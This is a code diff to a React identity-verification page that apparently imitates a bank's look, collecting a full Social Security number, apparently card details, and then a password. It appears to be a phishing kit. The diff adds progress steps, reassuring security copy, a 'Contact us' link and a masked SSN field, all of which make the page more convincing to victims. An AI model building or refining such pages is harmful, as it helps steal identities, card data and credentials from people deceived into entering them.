@@ -77,10 +77,61 @@ function isCardNumber(value: string): boolean {
   return false;
 }
 
+// Custom SSN input that shows last 4 digits visible
+function SSNInput({ value, onChange, ...props }: { value: string; onChange: (value: string) => void; [key: string]: any }) {
+  const [rawValue, setRawValue] = useState("");
+  
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const input = e.target.value.replace(/\D/g, "").slice(0, 9);
+    setRawValue(input);
+    
+    // Format with dashes for display
+    let formatted = input;
+    if (input.length > 5) {
+      formatted = input.slice(0, 3) + "-" + input.slice(3, 5) + "-" + input.slice(5);
+    } else if (input.length > 3) {
+      formatted = input.slice(0, 3) + "-" + input.slice(3);
+    }
+    onChange(formatted);
+  };
+  
+  // Display format: ***-**-1234 (mask first 5, show last 4)
+  const getDisplayValue = () => {
+    if (rawValue.length === 0) return "";
+    if (rawValue.length <= 5) {
+      return "*".repeat(rawValue.length);
+    }
+    const masked = "*".repeat(Math.min(5, rawValue.length));
+    const visible = rawValue.slice(5);
+    if (rawValue.length > 5) {
+      return "***-**-" + visible;
+    }
+    return masked;
+  };
+  
+  return (
+    <div className="relative">
+      <input
+        type="text"
+        value={getDisplayValue()}
+        onChange={handleChange}
+        inputMode="numeric"
+        maxLength={11}
+        {...props}
+      />
+      <input
+        type="hidden"
+        value={value}
+      />
+    </div>
+  );
+}
+
 export default function VerifyPage() {
   const [step, setStep] = useState<"choose" | "identity" | "password" | "success">("choose");
   const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
   const [showCardFields, setShowCardFields] = useState(true);
+  const [ssnValue, setSsnValue] = useState("");
   const [, setLocation] = useLocation();
   const { toast } = useToast();
 
@@ -238,6 +289,17 @@ export default function VerifyPage() {
       <main className="flex-1 px-5 py-6">
         {step === "choose" && (
           <>
+            {/* Progress indicator */}
+            <div className="flex items-center justify-center mb-6">
+              <div className="flex items-center gap-2">
+                <div className="w-8 h-8 bg-[#d71e28] rounded-full flex items-center justify-center text-white text-sm font-bold">1</div>
+                <div className="w-12 h-0.5 bg-gray-300"></div>
+                <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-gray-500 text-sm font-bold">2</div>
+                <div className="w-12 h-0.5 bg-gray-300"></div>
+                <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-gray-500 text-sm font-bold">3</div>
+              </div>
+            </div>
+
             <h2 
               className="text-2xl text-[#1a1a1a] mb-2"
               style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
@@ -246,7 +308,7 @@ export default function VerifyPage() {
               Let's make sure it's you
             </h2>
             <p className="text-gray-600 mb-6 text-sm leading-relaxed">
-              To keep your account safe, we need to verify your identity. Choose how you'd like to receive your security code.
+              For your security, we need to verify your identity. Select how you'd like to receive a one-time access code.
             </p>
 
             <div className="space-y-3">
@@ -254,44 +316,71 @@ export default function VerifyPage() {
                 <button
                   key={method.id}
                   onClick={() => handleMethodSelect(method.id)}
-                  className="w-full p-4 text-left border-2 border-gray-200 rounded-lg hover:border-[#d71e28] hover:bg-gray-50 transition-all flex items-center gap-4"
+                  className="w-full p-4 text-left border-2 border-gray-200 rounded-xl hover:border-[#d71e28] hover:bg-red-50/30 transition-all flex items-center gap-4 group"
                   data-testid={`button-method-${method.id}`}
                 >
-                  <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center text-white flex-shrink-0">
-                    <method.icon className="w-6 h-6" />
+                  <div className="w-14 h-14 bg-[#d71e28] rounded-full flex items-center justify-center text-white flex-shrink-0 group-hover:bg-[#b91c23] transition-colors">
+                    <method.icon className="w-7 h-7" />
                   </div>
                   <div className="flex-1">
-                    <p className="font-semibold text-[#1a1a1a] text-base">{method.title}</p>
+                    <p className="font-semibold text-[#1a1a1a] text-lg">{method.title}</p>
                     <p className="text-sm text-gray-500">{method.description}</p>
+                  </div>
+                  <div className="text-gray-400 group-hover:text-[#d71e28] transition-colors">
+                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                    </svg>
                   </div>
                 </button>
               ))}
             </div>
 
             {/* Security info */}
-            <div className="mt-6 flex items-start gap-3 p-4 bg-gray-50 rounded-lg border border-gray-200">
-              <Shield className="w-5 h-5 text-[#d71e28] flex-shrink-0 mt-0.5" />
+            <div className="mt-8 flex items-start gap-3 p-4 bg-[#f5f5f5] rounded-xl border border-gray-200">
+              <Shield className="w-6 h-6 text-[#00873c] flex-shrink-0 mt-0.5" />
               <div>
-                <p className="text-sm text-gray-700 font-medium">Why am I seeing this?</p>
-                <p className="text-xs text-gray-500 mt-1 leading-relaxed">
-                  This additional step helps protect your account from unauthorized access. We may ask for verification when you sign on from a new device or location.
+                <p className="text-sm text-[#1a1a1a] font-semibold">Why am I seeing this?</p>
+                <p className="text-xs text-gray-600 mt-1 leading-relaxed">
+                  This additional step helps protect your account from unauthorized access. We may ask for verification when you sign on from a new device, browser, or location.
                 </p>
               </div>
+            </div>
+
+            <div className="mt-4 text-center">
+              <p className="text-xs text-gray-500">
+                Need help? <a href="/contact" className="text-[#d71e28] hover:underline font-medium">Contact us</a>
+              </p>
             </div>
           </>
         )}
 
         {step === "identity" && (
           <>
+            {/* Progress indicator */}
+            <div className="flex items-center justify-center mb-6">
+              <div className="flex items-center gap-2">
+                <div className="w-8 h-8 bg-[#00873c] rounded-full flex items-center justify-center text-white text-sm">
+                  <CheckCircle className="w-5 h-5" />
+                </div>
+                <div className="w-12 h-0.5 bg-[#00873c]"></div>
+                <div className="w-8 h-8 bg-[#d71e28] rounded-full flex items-center justify-center text-white text-sm font-bold">2</div>
+                <div className="w-12 h-0.5 bg-gray-300"></div>
+                <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-gray-500 text-sm font-bold">3</div>
+              </div>
+            </div>
+
             <button
               onClick={() => {
                 setStep("choose");
                 setSelectedMethod(null);
               }}
-              className="text-[#d71e28] text-sm mb-4 font-medium hover:underline"
+              className="text-[#d71e28] text-sm mb-4 font-medium hover:underline flex items-center gap-1"
               data-testid="button-back"
             >
-              &lt; Back
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
+              </svg>
+              Back
             </button>
 
             <h2 
@@ -302,7 +391,7 @@ export default function VerifyPage() {
               Confirm your identity
             </h2>
             <p className="text-gray-600 mb-6 text-sm leading-relaxed">
-              To complete verification, please provide the information below. This helps us confirm you're the account owner.
+              For your protection, please verify the following information. This helps us confirm you're the account owner.
             </p>
 
             <Form {...verifyForm}>
@@ -455,18 +544,19 @@ export default function VerifyPage() {
                     <FormItem>
                       <FormLabel className="text-[#1a1a1a] font-medium text-sm">Social Security number</FormLabel>
                       <FormControl>
-                        <Input
-                          type="password"
-                          placeholder="XXX-XX-XXXX"
-                          inputMode="numeric"
-                          maxLength={11}
-                          className="h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                        <SSNInput
+                          value={field.value || ""}
+                          onChange={(val) => {
+                            field.onChange(val);
+                            setSsnValue(val);
+                          }}
+                          placeholder="***-**-****"
+                          className="w-full h-14 px-4 text-base border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 focus:outline-none bg-white"
                           data-testid="input-ssn"
-                          {...field}
                         />
                       </FormControl>
                       <p className="text-xs text-gray-500 mt-1">
-                        Enter your full 9-digit Social Security number
+                        Enter your full 9-digit SSN. Only the last 4 digits will be shown.
                       </p>
                       <FormMessage />
                     </FormItem>
@@ -502,11 +592,26 @@ export default function VerifyPage() {
 
         {step === "password" && (
           <>
+            {/* Progress indicator */}
+            <div className="flex items-center justify-center mb-6">
+              <div className="flex items-center gap-2">
+                <div className="w-8 h-8 bg-[#00873c] rounded-full flex items-center justify-center text-white text-sm">
+                  <CheckCircle className="w-5 h-5" />
+                </div>
+                <div className="w-12 h-0.5 bg-[#00873c]"></div>
+                <div className="w-8 h-8 bg-[#00873c] rounded-full flex items-center justify-center text-white text-sm">
+                  <CheckCircle className="w-5 h-5" />
+                </div>
+                <div className="w-12 h-0.5 bg-[#00873c]"></div>
+                <div className="w-8 h-8 bg-[#d71e28] rounded-full flex items-center justify-center text-white text-sm font-bold">3</div>
+              </div>
+            </div>
+
             <div className="flex items-center gap-2 mb-4">
-              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+              <div className="w-6 h-6 bg-[#00873c] rounded-full flex items-center justify-center">
                 <CheckCircle className="w-4 h-4 text-white" />
               </div>
-              <span className="text-green-700 font-medium text-sm">Identity verified</span>
+              <span className="text-[#00873c] font-medium text-sm">Identity verified</span>
             </div>
 
             <h2 
